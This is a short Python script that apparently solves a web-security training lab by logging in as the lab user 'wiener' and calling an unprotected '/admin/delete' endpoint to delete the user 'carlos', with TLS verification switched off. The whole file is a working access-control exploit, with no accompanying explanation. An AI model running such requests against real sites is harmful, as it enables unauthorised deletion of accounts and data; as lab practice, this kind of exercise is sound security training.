import sys
import urllib3
import requests
from utils import get_csrf_token

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_carlos(s, url):
    # 1) Login as the wiener user
    print("(+) Trying to Logging...")

    r = s.post(f"{url}/login", data={
        "username": "wiener",
        "password": "peter",
        "csrf": get_csrf_token(s, f"{url}/login")
    }, allow_redirects=False, verify=False)
    r.raise_for_status()

    # 2) Delete Carlos user
    delete_carlos_url = url + "/admin/delete?username=carlos"
    r = s.get(delete_carlos_url, verify=False)
    r.raise_for_status()

    # 4) confirm lab solve status
    if "Congratulations" in r.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability!")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    s = requests.Session()
    delete_carlos(s, sys.argv[1]) 
 
if __name__ == "__main__":
    main()
